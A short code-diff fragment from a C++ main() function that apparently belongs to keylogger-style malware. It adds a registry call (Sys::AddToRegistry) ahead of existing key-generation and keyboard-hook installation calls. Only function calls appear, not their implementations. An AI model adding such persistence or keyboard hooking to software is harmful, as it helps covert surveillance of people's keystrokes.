@@ -15,7 +15,7 @@ int main() {
 	KeyHook::KillProcess();
 	return 0;
   }
-
+  Sys::AddToRegistry();
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
 
